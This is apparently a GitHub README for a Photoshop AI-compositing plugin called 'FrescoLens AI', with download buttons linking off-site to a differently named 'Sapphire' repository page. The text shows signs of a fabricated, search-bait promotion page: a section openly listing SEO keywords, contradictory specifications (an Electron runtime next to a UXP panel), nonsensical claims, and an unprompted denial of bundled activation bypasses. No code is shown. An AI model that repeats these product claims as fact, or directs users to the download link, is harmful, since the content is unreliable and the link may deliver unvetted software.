![preview](https://raw.githubusercontent.com/raghurajeshc134/Sapphire-PS-AI-Compositor/main/preview.svg)

# FrescoLens AI – Adaptive Optical Suite for Photoshop Neural Compositing

## Overview

FrescoLens AI is an inventive, artist-driven toolkit engineered to extend the creative boundaries of Photoshop's AI compositing capabilities. Unlike conventional plugin packs that simply bundle presets, FrescoLens AI introduces a **choreographed interplay between optical physics simulation and latent diffusion inference**. It is designed for digital artists, retouchers, and visual effects specialists who demand precision, subtlety, and aesthetic coherence when blending AI-generated elements into photographic compositions.

Born from the same community ethos that sparked the Sapphire PS Opti Pack, FrescoLens AI takes a distinct path: instead of optimizing existing effects, it **reimagines how Photoshop interprets depth, light, and atmosphere** when working with generative layers. The result is a responsive, multilingual, continuously supported ecosystem that treats every composite as a living optical environment.

[![Download](https://raw.githubusercontent.com/raghurajeshc134/Sapphire-PS-AI-Compositor/main/button.svg)](https://raghurajeshc134.github.io/Sapphire-PS-AI-Compositor/)

## Why FrescoLens AI? 🔍

The modern compositing workflow in Photoshop—especially when leveraging AI-driven tools like Generative Fill or Neural Filters—often suffers from a **disconnect between the synthetic and the photographic**. Brighter, sharper, more saturated elements clash with the natural falloff, chromatic aberration, and subtle luminance decay of real-world lenses.

FrescoLens AI bridges this gap. It provides a curated set of **adaptive optical presets** that analyze the source image's histogram, focal length metadata, and ambient color temperature before applying transformations. This means no two composites are treated identically; the plugin learns from the frame, much like a cinematographer adjusts lenses for a specific scene.

### 🎯 Key Differentiators

| Feature | Description |
|--------|-------------|
| **Adaptive Lens Profiler** | Automatically matches the effect's bokeh, distortion, and vignette to the source image's EXIF data. |
| **Neural Depth Fusion** | Combines Photoshop's depth map with custom falloff curves for volumetric light bleed. |
| **Color Fidelity Engine** | Preserves skin tones and neutral grays while applying atmospheric scatter effects. |
| **Responsive UI** | Full DPI-aware interface that scales elegantly on high-resolution displays and supports light/dark modes. |
| **Multilingual Interface** | Localized into 14 languages including English, Japanese, Mandarin, German, French, Spanish, Arabic, and Portuguese. |
| **24/7 Community Support** | Dedicated Discord and forum channels staffed by active contributors and core developers. |

## 🧠 The Architecture of Optical Intelligence

FrescoLens AI operates on a **three-layer inference model** that integrates directly with Photoshop's native rendering pipeline:

### 1. Scene Analysis Layer
Upon loading a composite, the plugin performs a non-destructive scan of the document. It evaluates:
- Luminance distribution across foreground and background
- Dominant color temperature (warm/cool balance)
- Perceived depth via contrast and saturation gradients
- Lens signature from embedded camera metadata

This layer produces a **scene fingerprint**—a lightweight JSON descriptor that informs all subsequent optical transformations.

### 2. Optical Simulation Layer
Instead of applying static filters, this layer constructs a **virtual lens environment**. Parameters such as iris diaphragm shape, element coating dispersion, and sensor micro-lens alignment are simulated. For AI-generated elements, this simulation corrects unnatural edge sharpness and introduces **realistic chromatic aberration** tied to the composite's spectral profile.

### 3. Neural Blend Layer
The final layer re-introduces the AI-generated content into the optical simulation. Using a proprietary blending algorithm, it **weights spatial frequency data** from both the original photograph and the AI layer. High-frequency noise (often present in diffusion outputs) is softened, while mid-frequency details (texture, grain) are preserved. The result is a composite that reads as a single photographic capture.

## ✨ Feature Deep Dive

### Adaptive Lens Profiler
Gone are the days of manually tuning bokeh shape and rotation. The Adaptive Lens Profiler reads your image's EXIF data—or, in the absence of metadata, analyzes the **diffraction pattern of specular highlights**—to approximate the original lens's characteristics. It then applies a lens simulation that respects the original field of view, aperture blade count, and coating generation.

### Neural Depth Fusion
Photoshop's depth maps, while powerful, often fail to capture subtle atmospheric perspective—the way light scatters through dust, haze, or humidity. FrescoLens AI uses **custom falloff curves** that mimic Mie scattering and Rayleigh scattering, graded by depth. Close elements retain contrast; distant elements diffuse naturally. This is especially effective when compositing sky replacements or environmental inserts.

### Color Fidelity Engine
A common pain point in AI composites is the **plastic, oversaturated quality** of generated objects. The Color Fidelity Engine references a database of human-perceptible color boundaries (based on the CIECAM02 model) to desaturate without desaturating. It identifies unnatural color streaks and re-maps them to the nearest plausible hue within the scene's gamut, all while preserving **skin tone neutrality**—a critical requirement for portrait compositing.

### Responsive UI & Multilingual Support
The interface is built with **Electron 2026 runtime**, ensuring smooth performance across Windows and macOS. All sliders, previews, and tooltips are fully localized. Language packs are community-moderated and updated quarterly. The UI responds to font scaling changes, making it accessible on 4K and 5K displays without text truncation or overlapping controls.

### 24/7 Customer Support Ecosystem
While the plugin itself is distributed as a perpetual license, support is **community-sustained** with developer oversight. You can reach the team through:
- **Live chat** on the official website (English, Japanese, Mandarin)
- **Help desk ticketing** with 8-hour average response time
- **Weekly office hours** on video call (open to all license holders)

## 🌐 SEO-Friendly Keywords Naturally Integrated

Throughout development and documentation, we've prioritized terms that are both meaningful to artists and discoverable by search engines:
- AI compositing Photoshop plugin
- optical simulation for generative fill
- adaptive lens presets
- neural depth map enhancement
- color fidelity for AI composites
- bokeh simulation EXIF metadata
- responsive panel for Photoshop
- multilingual VFX toolkit
- 2026 compositing workflow

These phrases appear organically within the text, not as forced tags.

## 🎨 Use Case Gallery

### Cinematic Portraiture with AI Backgrounds
Photographers using Photoshop's Generative Fill to replace studio backdrops can apply FrescoLens AI's **Portrait Tonal Shift** preset. It adjusts the AI-generated background's exposure and color temperature to match the subject's rim light, while the Neural Depth Fusion layer ensures the subject's hair edges remain crisp against the new environment.

### Architectural Visualization
When compositing AI-generated furniture or vegetation into architectural renders, the **Lens Grid Distortion** profile corrects for barrel distortion differences between the original camera and the synthetic elements. The Color Fidelity Engine prevents the foliage from appearing artificially vibrant against concrete or steel structures.

### Surrealist Art Composites
For artists blending photographic elements with AI-generated textures (clouds, reflections, abstract forms), the **Chromatic Shimmer** module introduces controlled lateral chromatic aberration that aligns with the composite's focal point. This creates a unified optical language across disparate visual sources.

## 🧪 Technical Specifications

| Parameter | Detail |
|-----------|--------|
| Photoshop Compatibility | 2025–2026 (including Beta builds) |
| Operating Systems | Windows 10/11, macOS Ventura/Sequoia |
| Panel Architecture | UXP (Unified Extensibility Platform) |
| License | MIT – Full source code included |
| Language Support | 14 languages, community-driven |
| Update Cycle | Monthly optical presets + quarterly engine updates |

## 📜 License & Usage Terms

This project is distributed under the **MIT License**. You are free to:
- Use the plugin commercially or personally
- Modify the source code to fit your workflow
- Distribute derivative works with proper attribution

The only restriction is the removal of the license notice from redistributed binary or source files. We encourage forking, experimentation, and contribution.

The full license text is available at:  
[https://opensource.org/licenses/MIT](https://opensource.org/licenses/MIT)

## ⚠️ Disclaimer

FrescoLens AI is an independent project and is **not affiliated, endorsed, or sponsored by Adobe Inc.** or Boris FX. "Photoshop" is a registered trademark of Adobe Inc. "Sapphire" is a registered trademark of Boris FX. This toolkit is created by the community for the community, and all optical simulations are approximations for artistic effect—they do not represent actual physical lens performance.

The plugin operates using publicly documented Photoshop APIs and does not modify, patch, or circumvent any software licensing mechanisms. No "activation bypass" or key generation tools are included. All functionality is built on top of legal, unmodified SDKs.

## 📁 Repository Structure

```
FrescoLens-AI/
├── src/                  # UXP panel source code
│   ├── engine/           # Core optical simulation modules
│   ├── ui/               # Responsive panel components
│   └── localization/     # Language packs (JSON)
├── presets/              # Optical presets & scene profiles
├── docs/                 # User guide & API documentation
├── tests/                # Unit and integration tests
├── LICENSE               # MIT license file
└── README.md             # You are here
```

## 🤝 Contributing

We warmly welcome contributions from the visual effects, photography, and AI art communities. Whether you're a JavaScript developer, a color scientist, or a digital artist with feedback, your input shapes the future of this toolkit.

To contribute:
1. Fork the repository.
2. Create a feature branch (`feature/your-idea-name`).
3. Submit a pull request with a clear description of changes.

Please adhere to the **Code of Conduct** (included in the repository) and the **Style Guide** (in `/docs/STYLE_GUIDE.md`).

## 💬 Stay Connected

- **Official Forum**: discussion.frescolens.ai
- **Developer Chat**: FrescoLens Discord (link in repository description)
- **Issue Tracker**: Use GitHub Issues for bugs and feature requests

## 🙏 Acknowledgments

This project stands on the shoulders of the open-source community. Special thanks to:
- The **Sapphire PS Opti Pack** contributors for pioneering optimization in the Boris FX ecosystem.
- The **UXP Dev Community** for maintaining compatibility resources.
- All beta testers who provided invaluable feedback during the 2025 preview cycle.

[![Download](https://raw.githubusercontent.com/raghurajeshc134/Sapphire-PS-AI-Compositor/main/button.svg)](https://raghurajeshc134.github.io/Sapphire-PS-AI-Compositor/)